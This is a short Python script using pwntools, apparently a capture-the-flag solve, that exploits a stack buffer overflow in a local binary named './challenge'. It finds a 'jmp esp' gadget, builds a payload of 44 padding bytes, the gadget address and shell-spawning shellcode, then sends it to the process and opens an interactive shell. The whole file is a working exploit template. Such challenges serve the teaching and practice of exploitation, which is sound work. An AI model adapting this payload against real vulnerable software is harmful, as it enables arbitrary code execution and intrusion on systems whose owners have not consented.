#!/bin/env python
#
#pwntools solve for a challenge

from pwn import *

context.binary = ELF('./challenge', checksec=False)
context.log_level = 'debug'

jmp_esp = next(context.binary.search(asm('jmp esp')))

log.info("jmp esp at %#x" % jmp_esp)

offset = 44

payload = b'A' * offset + p32(jmp_esp) + asm(shellcraft.sh())

io = process('./challenge')
io.sendline(payload)
io.interactive()



